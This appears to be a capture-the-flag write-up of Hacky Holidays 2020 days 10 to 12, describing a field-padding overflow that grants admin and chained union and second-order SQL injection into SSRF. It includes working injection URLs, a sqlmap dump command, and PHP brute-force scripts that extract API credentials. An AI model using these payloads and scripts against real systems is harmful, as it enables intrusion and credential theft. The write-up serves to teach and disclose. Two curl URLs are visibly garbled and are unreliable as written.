based on instruction 6 from README.md, each user record in the txt db is in a line, and if that line ends with Y, we're admin

when pressing signup button `$cookie = addUser($username, $password, $age, $firstname, $lastname);` is executed after passing several checks

```
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    echo $line;
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
```

the final result will always be truncated to 113bytes+newline, each element of the final row is padded to it's hardcoded length
the checks are pretty strict

```

            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
            if (strlen($username) < 3) {
                $errors[] = 'Username must by at least 3 characters';
            } else {
                if (isset($all_users[$username])) {
                    $errors[] = 'Username already exists';
                }
            }
            $password = md5($_POST["password"]);
            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
            if (strlen($firstname) < 3) {
                $errors[] = 'First name must by at least 3 characters';
            }
            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
            if (strlen($lastname) < 3) {
                $errors[] = 'Last name must by at least 3 characters';
            }
            if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
```
all elements length are checked exactly before sending them to `addUser()` function except for age which is affected strval right after the length check, but php is funny, `$_GET['age']` when sent to strval it will be evaluated as an int, we can use floats and exponential

```
$ php -a
Interactive mode enabled

php > echo str_pad('30',3,'#');
30#
php > echo str_pad('300000000000000000',3,'#');
300000000000000000
php > echo str_pad(3e9,3,'#');
3000000000
```

thus, age variable can push the ones coming after it `firstname` and `lastname` and we can have Y appended at the end of the string
```
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
```

```
$ curl https://hackyholidays.h1ctf.com/signup-manager/ -d 'action=signup&username=ooooooooooooooo&password=password&age=3e9&firstname=YYYYYYYYYYYYYYYYYY&lastname=YYYYYYYYYYYYYYYYYY' -vv
[...]
> POST /signup-manager/ HTTP/1.1
> Host: hackyholidays.h1ctf.com
> User-Agent: curl/7.58.0
> Accept: */*
> Content-Length: 117
> Content-Type: application/x-www-form-urlencoded
> 
[...]
< HTTP/1.1 302 Found
< Server: nginx/1.18.0 (Ubuntu)
< Date: Wed, 23 Dec 2020 01:48:36 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: token=c66cbe646e0e05df1ba8b04b492f6f84; 
< Location: /signup-manager/
< 

$ curl https://hackyholidays.h1ctf.com/signup-manager/ -H 'Cookie: token=c66cbe646e0e05df1ba8b04b492f6f84'
[...]
<p class="text-center">flag{99309f0f-1752-44a5-af1e-a03e4150757d}</p>
<p class="text-center">You made it through, continue to your next task <a href="/r3c0n_server_4fdk59">here</a></p>
[...]
```
we got a flag, and next challenge will be at: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59	



----------------------------------------------------------------

## Day 11


Day11 starts from url we got the end of day10 which is https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59, this challenge was pretty fun, collecting different pieces together to obtain a flag

there's some photo albums, and a message saying there's an api under developement

### Key 1

regarding the api its at https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api, there's given a documentation about the api response codes
```
HTTP Status Code  Explanation
200 Successful request with data returned
204 Successful request but with no data found
404 Invalid Endpoint
400 Invalid GET/POST variable
401 Unauthenticated Request or Invalid client IP
```
by trying to enumerate any endpoint from our ip we have 401 response code, probably internal API, so we might need an ssrf to query this api
```
$ curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/lol
{"error":"This endpoint cannot be visited from this IP address"}
```

### Key 2

when browsing to any album ex:https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k
the pictures in page source are coming from some handler not direct image url
```
<img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9">
```
pointing to `/r3c0n_server_4fdk59/picture?data=[BASE64_JSON_DATA]`

```
$ printf eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9|base64 -d
{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
```
if we try to call those images directly we're not allowed apparently

```
$ curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/uploads/db507bdb186d33a719eb045603020cec.jpg
Image cannot be viewed directly
```

if we try to tamper with the image path we get another error message

```
$ curl https://hackyholidays.h1ctf.comta=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2UyLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9
invalid authentication hash
```

so the auth field, is serving as a signature, i tried to guess what it is by brutercing salt with the path but no luck.

### Key 3

the album endpoint is vulnerable to a blind SQLi 
```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27and%201=1--%20-                              =>  TRUE  (image list returned)
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27and%201=2--%20-                              =>  FALSE (404 page)
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27order%20by%203--%20-                         =>  TRUE
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27union%20select%201,2,3%20limit%200,1--%20-   =>  TRUE, 3 printed instead of album name
```

union based mysql injection, then i went to dump the whole db with sqlmap

```
$ python sqlmap.py -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dbms=mysql --technique=U --threads=10 -D recon --dump-all
[...]
[...]
[...]
Database: recon
Table: album
[3 entries]
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+
[...]
[...]
[...]
Database: recon
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+
```

we have 2 tables with no interesting content, no auth hashes in the db, so this means they are probably generated after fetching data from query

i had doubt that there's 2 different queries executed in the backend instead of using some join for both tables in a single query
to clear my doubt i wanted to check what was the current query that is executed while we are injecting our payload,
luckily enough, mysql keep running processes in a table, read more about it here https://www.devart.com/dbforge/mysql/studio/show-running-queries-in-processlist.html
so let's do `SELECT INFO FROM INFORMATION_SCHEMA.PROCESSLIST WHERE db ='recon' limit 0,1`, again i used sqlmap 
```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-jdh34k%27union%20select%201,2,INFO%20from%20information_schema.processlist%20where%20db=%27recon%27%20limit%200,1--%20-

select * from album where hash = '-jdh34k'union select 1,2,INFO from information_schema.processlist where db='recon' limit 0,1-- -
```
so the query is `select * from album where hash='[OUR_INPUT]'`
now, i can only assume that result of this query either id or name is passed to a second query that selects from photo table

### sqli inside an sqli to SSRF

based on assumption from `Key 3`, we potentially have a second order sql injection, we already know query selecting * from album which has 3 columns
```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27union%20select%201,2,3--%20-                            => FALSE
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27union%20select%20*%20from%20album%20limit%200,1--%20-   => TRUE
```
this means first query should return valid row that goes with second query somewhere
```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-jdh34k%27union%20select%201,2,3%20limit%200,1--%20-
```
this returns photos from album with id 1, so second query is taking 1st column result inside union to the second query, let's do another sqli inside 1st column
```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-jdh34k%27union%20select%20(select%20%22%27%20union%20select%20%27a%27,%27b%27,%27c%27--%20-%22),2,3%20as%20id%20limit%200,1--%20-
```
page returned with invalid image, 
```
$ printf eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2EiLCJhdXRoIjoiZWU1YjY2Y2E2YmMyNGMyNTI3NjZlZjZlNzhjZWQ2MGYifQ==|base64 -d
{"image":"r3c0n_server_4fdk59\/uploads\/c","auth":"ee5b66ca6bc24c252766ef6e78ced60f"}
```
the generated json has changed ;), and has valid signature
```
$ curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/pictuta=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2MiLCJhdXRoIjoiNTBlNGI3NTg2ZTRlMGU4MzhiOWYzNzNjYTdmYzZjMzMifQ== 
Expected HTTP status 200, Received: 404
```
the response makes sense since that url doesnt exist, we didnt get page body though!
we finally got the SSRF.


### Enumerating the api

now that we have an ssrf let's fetch the api, 
```
$ curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-jdh34k%27union%20select%20(select%20%22%27%20union%20select%20%27a%27,%27b%27,%27../api/%27--%20-%22),2,3%20as%20id%20limit%200,1--%20-
[...]
<img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9">
[...]

$ curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9
Invalid content type detected
```
very odd message, based on this and the very previous request to `/api/c`, we only have response codes, and if response code is 200, message is `Invalid content type detected`, looks like a good oracle to exfiltrate data semi blindly

we can enumerate the api endpoints, based on response codes with help from api documentation, i made a small php script to do that
```
$ cat brute1.php
<?php
$a = file_get_contents("https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-3dir42%27%20union%20select%20(select%20%22%27%20union%20select%201,2,%27../api/".$argv[1]."%27--%20-%22)%20as%20id,1,1%20from%20album%20limit%200,1--%20-");
preg_match("/<img class=\"img\-responsive\" src=\"(.*?)\">/", $a,$ma);
$b= file_get_contents("https://hackyholidays.h1ctf.com".$ma[1]);
if (!preg_match("/Received\: 404/", $b)) echo $argv[1]."\n";

$ for i in $(cat ./wordlist.txt); do php brute1.php $i; done
user
ping
benchmark
sleep
```

enumerating the parameters for user endpoint (there was not much in the other ones)
```
$ cat brute2.php
<?php
$a = file_get_contents("https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-3dir42%27%20union%20select%20(select%20%22%27%20union%20select%201,2,%27../api/user?".$argv[1]."%27--%20-%22)%20as%20id,1,1%20from%20album%20limit%200,1--%20-");
preg_match("/<img class=\"img\-responsive\" src=\"(.*?)\">/", $a,$ma);
$b= file_get_contents("https://hackyholidays.h1ctf.com".$ma[1]);
if (!preg_match("/Received\: 400/", $b)) echo $argv[1]."\n";

$ for i in $(cat ./wordlist.txt); do php brute2.php $i; done
username
password
0
```

ok, now we have `user` endpoint with parameters `username` and `password`

### Extracting username and password

the api `/user` when supplying any random username or password value it returns error 202 which means `Successful request but with no data found`, so its kind of checking on the username or password supplied with some database in the backend for the api.
after some trial and error i found out that when providing `%` as username returns status 200, so it serves as a wildcard, probably another mysql as dbms and search and matching with `LIKE` statement
now it's just matter of bruteforcing the username and password by char, `LIKE` in mysql is case insensitive, hopefully this doesnt ruin the extracted user and pass :)
again a small php shizzle to do the job
```
$ cat b.php
<?php
$str="";
for($j=0;$j<128;$j++){
  echo "pos: ".$j."\n";
  for($i=30;$i<128;$i++){
    if(!in_array(chr($i), array('%','#','"',"'")) ){
      $a = file_get_contents("https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-3dir42%27%20union%20select%20(select%20\"%27%20union%20select%201,2,%27../api/user?".$argv[1]."=".urlencode($str.chr($i))."%25%27--%20-\")%20as%20id,1,1%20from%20album%20limit%200,1--%20-");
      preg_match("/<img class=\"img\-responsive\" src=\"(.*?)\">/", $a,$ma);
      $lol= @file_get_contents("https://hackyholidays.h1ctf.com".$ma[1]);
      if($lol=='Invalid content type detected'){
        $str .= chr($i);
        echo $str."\n";
        break;
      }
    }
  }
}

$ php b.php username
pos: 0
G
pos: 1
GR
pos: 2
GRI
pos: 3
GRIN
pos: 4
GRINC
pos: 5
GRINCH
pos: 6
GRINCHA
pos: 7
GRINCHAD
pos: 8
GRINCHADM
pos: 9
GRINCHADMI
pos: 10
GRINCHADMIN
pos: 11
pos: 12
^C

$ php b.php password
pos: 0
S
pos: 1
S4
pos: 2
S4N
pos: 3
S4NT
pos: 4
S4NT4
pos: 5
S4NT4S
pos: 6
S4NT4SU
pos: 7
S4NT4SUC
pos: 8
S4NT4SUCK
pos: 9
S4NT4SUCKS
pos: 10
pos: 11
pos: 12
^C

```

creds extracted are `GRINCHADMIN:S4NT4SUCKS`

### Getting the flag

back to attack box login interface now, https://hackyholidays.h1ctf.com/attack-box
since like in mysql is case insensitive first attempt with `GRINCHADMIN:S4NT4SUCKS` failed
luckily no guessing mojo involved turned it all to lowercase and it went through

```
Come back tomorrow
flag{07a03135-9778-4dee-a83c-7ec330728e72}
```
attack-box should be last day challenge starting point.

----------------------------------------------------------------

## Day 12

here's the flag for it,  flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
writeup following in the next comment

## Impact

dox the grinch

## Attachments
No attachments
